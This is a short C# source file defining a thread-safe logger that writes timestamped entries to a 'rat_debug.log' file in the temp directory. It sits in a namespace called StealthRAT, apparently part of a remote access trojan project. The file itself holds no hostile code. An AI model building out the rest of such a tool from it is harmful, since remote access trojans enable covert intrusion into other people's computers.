using StealthRAT.Interfaces;

namespace StealthRAT.Services;

/// <summary>
/// Implements file-based logging with thread-safe write operations.
/// Logs are written to a temporary file for debugging purposes.
/// </summary>
public sealed class FileLoggerService : ILoggerService
{
    private readonly string _logFilePath;
    private readonly object _writeLock = new();

    /// <summary>
    /// Initializes a new instance of the <see cref="FileLoggerService"/> class.
    /// </summary>
    /// <param name="logFileName">The name of the log file to create in the temp directory.</param>
    public FileLoggerService(string logFileName = "rat_debug.log")
    {
        _logFilePath = Path.Combine(Path.GetTempPath(), logFileName);
    }

    /// <inheritdoc/>
    public void LogInfo(string message)
    {
        WriteEntry("INFO", message);
    }

    /// <inheritdoc/>
    public void LogError(string message, Exception? exception = null)
    {
        string fullMessage = exception != null
            ? $"{message} | Exception: {exception.Message}"
            : message;
        WriteEntry("ERROR", fullMessage);
    }

    /// <inheritdoc/>
    public void LogWarning(string message)
    {
        WriteEntry("WARN", message);
    }

    /// <summary>
    /// Writes a formatted log entry to the file in a thread-safe manner.
    /// Silently handles any I/O exceptions to prevent logging from
    /// disrupting the main application flow.
    /// </summary>
    /// <param name="level">The log severity level (INFO, WARN, ERROR).</param>
    /// <param name="message">The message content to log.</param>
    private void WriteEntry(string level, string message)
    {
        try
        {
            string entry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} [{level}] {message}{Environment.NewLine}";
            lock (_writeLock)
            {
                File.AppendAllText(_logFilePath, entry);
            }
        }
        catch (IOException)
        {
            // Silently ignore logging failures to prevent cascading errors
        }
    }
}
